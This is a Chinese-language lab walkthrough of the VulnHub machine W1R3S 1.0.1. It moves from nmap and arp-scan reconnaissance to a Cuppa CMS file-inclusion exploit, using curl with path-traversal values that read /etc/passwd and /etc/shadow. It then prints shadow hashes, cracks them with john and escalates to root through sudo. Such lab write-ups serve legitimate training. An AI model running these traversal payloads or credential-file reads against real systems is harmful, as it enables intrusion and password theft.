---
{"dg-publish":true,"dg-path":"安全/靶机/vulnhub_W1R3S 1.0.1.md","permalink":"/安全/靶机/vulnhub_W1R3S 1.0.1/","title":"vulnhub_W1R3S 1.0.1"}
---

# 主机扫描
```shell
┌─[kongyu@parrot]─[~]
└──╼ $sudo nmap -sn 192.168.1.0/24
[sudo] password for kongyu:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-09 06:40 EST
...
MAC Address: 06:16:D6:54:48:60 (Unknown)
Nmap scan report for 192.168.1.56
Host is up (0.0015s latency).
MAC Address: 00:0C:29:01:CA:BA (VMware)
Nmap scan report for 192.168.1.55
Host is up.
Nmap done: 256 IP addresses (11 hosts up) scanned in 36.09 seconds
```

`-sn`模式表示不进行端口扫描
具体来说，`nmap -sn` 会做以下几种探测：

1. **ICMP Echo Request**: 类似于普通的 `ping`，向目标发送 ICMP 回显请求包，看目标是否回应。
2. **ARP Request**: 如果扫描的是局域网中的主机，`nmap` 会发送 ARP 请求来检查目标是否存在。
3. **TCP SYN**: 向指定端口（通常是 80、443 等常用端口）发送 TCP SYN 包，检查是否有响应。

如果目标主机对这些探测包有响应（如返回 ICMP 回显应答，或者回复 TCP RST 等），则认为该主机是在线的。




```shell
┌─[✗]─[kongyu@parrot]─[~]
└──╼ $sudo arp-scan --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:be:a7:df, IPv4: 192.168.1.55
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1     c8:9f:1a:e3:d7:c6       HUAWEI TECHNOLOGIES CO.,LTD
192.168.1.2     d4:da:21:14:00:89       Beijing Xiaomi Mobile Software Co., Ltd
192.168.1.5     e8:f6:54:17:9e:4d       HUAWEI TECHNOLOGIES CO.,LTD
192.168.1.14    60:7d:09:95:0f:e1       Luxshare Precision Industry Co., Ltd
192.168.1.15    60:7d:09:86:b8:e4       Luxshare Precision Industry Co., Ltd
192.168.1.53    06:16:d6:54:48:60       (Unknown: locally administered)
192.168.1.56    00:0c:29:01:ca:ba       VMware, Inc.
192.168.1.49    7a:f2:01:ab:96:d4       (Unknown: locally administered)
192.168.1.50    4e:d0:c8:45:db:fe       (Unknown: locally administered)

9 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.423 seconds (105.65 hosts/sec). 9 responded
```

# 端口扫描


## TCP端口扫描
```shell
┌─[kongyu@parrot]─[~/workspace]
└──╼ $sudo nmap -sT -mmin-rate 10000 -p- 192.168.1.56 -oA nmapscan/ports
[sudo] password for kongyu:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-09 07:34 EST
Nmap scan report for 192.168.1.56
Host is up (0.0019s latency).
Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:01:CA:BA (VMware)

Nmap done: 2 IP addresses (1 host up) scanned in 52.86 seconds
```

```shell
┌─[kongyu@parrot]─[~/workspace]
└──╼ $ls nmapscan/
ports.gnmap  ports.nmap  ports.xml
```


```shell
┌─[kongyu@parrot]─[~/workspace]
└──╼ $sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.1.56 -oA nmapscan/detail
```
```shell
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.1.55
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
```

## UDP端口扫描

```shell
┌─[✗]─[kongyu@parrot]─[~/workspace]
└──╼ $sudo nmap -sU -top-ports 20 192.168.1.56 -oA nmapscan/udp
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-09 12:26 EST
Nmap scan report for 192.168.1.56
Host is up (0.0021s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
MAC Address: 00:0C:29:01:CA:BA (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.99 seconds
```

## 脚本扫描

```shell
┌─[kongyu@parrot]─[~/workspace]
└──╼ $sudo nmap --script=vuln -p21,80,22,3306 192.168.1.56 -oA nmapscan/vuln
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-09 12:28 EST
Nmap scan report for 192.168.1.56
Host is up (0.0013s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum:
|_  /wordpress/wp-login.php: Wordpress login page.
3306/tcp open  mysql
MAC Address: 00:0C:29:01:CA:BA (VMware)

Nmap done: 1 IP address (1 host up) scanned in 322.00 seconds
```



# FTP 渗透







# WEB渗透
前面看到靶机上开着80端口web服务，看一下
![Pasted image 20250109195939.png](/img/user/picture/Pasted%20image%2020250109195939.png)
只是一个apache的一个初始界面，没什么重要信息
进行一下目录扫描
```shell
sudo gobuster dir -u http://192.168.1.56 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
![Pasted image 20250109200309.png](/img/user/picture/Pasted%20image%2020250109200309.png)
在`/administrator`进去是一个配置页面
![Pasted image 20250109200416.png](/img/user/picture/Pasted%20image%2020250109200416.png)
![Pasted image 20250109200343.png](/img/user/picture/Pasted%20image%2020250109200343.png)
尝试配置没成功
去搜索一下这个cms存在的漏洞
```shell
searchsploit cuppa
```
关于漏洞搜索工具的使用参考：
https://isbase.cc/article/searchsploit/script-1.html

![Pasted image 20250109200627.png](/img/user/picture/Pasted%20image%2020250109200627.png)

下载这个文件查看：
```shell
searchsploit -m 25971
```
![Pasted image 20250109200710.png](/img/user/picture/Pasted%20image%2020250109200710.png)
可以看到有一个文件包含漏洞

![Pasted image 20250109200738.png](/img/user/picture/Pasted%20image%2020250109200738.png)
![Pasted image 20250109200818.png](/img/user/picture/Pasted%20image%2020250109200818.png)
但是执行后没有读出数据，看一下是什么情况，可以去网上找一下这个CMS的源码查看一下
https://github.com/CuppaCMS/CuppaCMS/blob/master/alerts/alertConfigField.php
![Pasted image 20250109201011.png](/img/user/picture/Pasted%20image%2020250109201011.png)
可以看到这里使用post来传递的参数

```shell
curl --data-urlencode 'urlConfig=../../../../../../../../../etc/passwd' http://192.168.1.56/administrator/alerts/alertConfigField.php
```
![Pasted image 20250109201120.png](/img/user/picture/Pasted%20image%2020250109201120.png)
密码在shadow中，看一下能不能读
```shell
curl --data-urlencode 'urlConfig=../../../../../../../../../etc/shadow' http://192.168.1.56/administrator
/alerts/alertConfigField.php
```
![Pasted image 20250109201209.png](/img/user/picture/Pasted%20image%2020250109201209.png)

把有用信息提取一下保存到文件中
```txt
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
```

用john尝试破解
```shell
sudo john shadow.txt
```
![Pasted image 20250109205109.png](/img/user/picture/Pasted%20image%2020250109205109.png)


现在可以登录w1r3s
![Pasted image 20250109205210.png](/img/user/picture/Pasted%20image%2020250109205210.png)

尝试提权：

![Pasted image 20250109205229.png](/img/user/picture/Pasted%20image%2020250109205229.png)

发现用户具有sudo全部权限
![Pasted image 20250109205306.png](/img/user/picture/Pasted%20image%2020250109205306.png)

完成
![Pasted image 20250109205327.png](/img/user/picture/Pasted%20image%2020250109205327.png)
